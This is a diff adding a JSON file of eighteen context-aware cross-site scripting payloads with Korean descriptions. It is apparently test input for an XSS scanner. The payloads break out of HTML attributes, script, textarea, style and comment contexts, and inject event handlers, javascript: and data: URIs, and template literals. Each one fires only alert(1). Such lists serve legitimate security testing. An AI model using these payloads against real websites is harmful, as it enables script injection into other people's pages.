@@ -1,0 +1,132 @@
+{
+  "category": "context_aware",
+  "description": "컨텍스트 인식 페이로드 - HTML, JavaScript, CSS 등 다양한 컨텍스트에 맞춤",
+  "payloads": [
+    {
+      "id": "context_001",
+      "payload": "\"><script>alert(1)</script>",
+      "description": "HTML 태그 속성 탈출 (큰따옴표)",
+      "context": ["attribute"],
+      "severity": "high"
+    },
+    {
+      "id": "context_002",
+      "payload": "'><script>alert(1)</script>",
+      "description": "HTML 태그 속성 탈출 (작은따옴표)",
+      "context": ["attribute"],
+      "severity": "high"
+    },
+    {
+      "id": "context_003",
+      "payload": "</script><script>alert(1)</script>",
+      "description": "스크립트 태그 탈출",
+      "context": ["script"],
+      "severity": "high"
+    },
+    {
+      "id": "context_004",
+      "payload": "';alert(1);//",
+      "description": "JavaScript 문자열 탈출 (작은따옴표)",
+      "context": ["script"],
+      "severity": "high"
+    },
+    {
+      "id": "context_005",
+      "payload": "\";alert(1);//",
+      "description": "JavaScript 문자열 탈출 (큰따옴표)",
+      "context": ["script"],
+      "severity": "high"
+    },
+    {
+      "id": "context_006",
+      "payload": "</textarea><script>alert(1)</script>",
+      "description": "textarea 태그 탈출",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "context_007",
+      "payload": "</title><script>alert(1)</script>",
+      "description": "title 태그 탈출",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "context_008",
+      "payload": "</style><script>alert(1)</script>",
+      "description": "style 태그 탈출",
+      "context": ["css"],
+      "severity": "high"
+    },
+    {
+      "id": "context_009",
+      "payload": "\" onmouseover=\"alert(1)\"",
+      "description": "속성 내에서 이벤트 핸들러 주입",
+      "context": ["attribute"],
+      "severity": "high"
+    },
+    {
+      "id": "context_010",
+      "payload": "' onmouseover='alert(1)'",
+      "description": "속성 내에서 이벤트 핸들러 주입 (작은따옴표)",
+      "context": ["attribute"],
+      "severity": "high"
+    },
+    {
+      "id": "context_011",
+      "payload": "javascript:alert(1)",
+      "description": "javascript: 프로토콜 (href 속성)",
+      "context": ["attribute"],
+      "severity": "high"
+    },
+    {
+      "id": "context_012",
+      "payload": "data:text/html,<script>alert(1)</script>",
+      "description": "data: URI",
+      "context": ["attribute"],
+      "severity": "high"
+    },
+    {
+      "id": "context_013",
+      "payload": "-alert(1)-",
+      "description": "JavaScript 표현식 컨텍스트",
+      "context": ["script"],
+      "severity": "medium"
+    },
+    {
+      "id": "context_014",
+      "payload": "${alert(1)}",
+      "description": "템플릿 리터럴 주입",
+      "context": ["script"],
+      "severity": "high"
+    },
+    {
+      "id": "context_015",
+      "payload": "</noscript><script>alert(1)</script>",
+      "description": "noscript 태그 탈출",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "context_016",
+      "payload": "--><script>alert(1)</script>",
+      "description": "HTML 주석 탈출",
+      "context": ["html"],
+      "severity": "high"
+    },
+    {
+      "id": "context_017",
+      "payload": "*/alert(1)//",
+      "description": "JavaScript 주석 탈출",
+      "context": ["script"],
+      "severity": "high"
+    },
+    {
+      "id": "context_018",
+      "payload": "`${alert(1)}`",
+      "description": "백틱 템플릿 리터럴",
+      "context": ["script"],
+      "severity": "high"
+    }
+  ]
+}
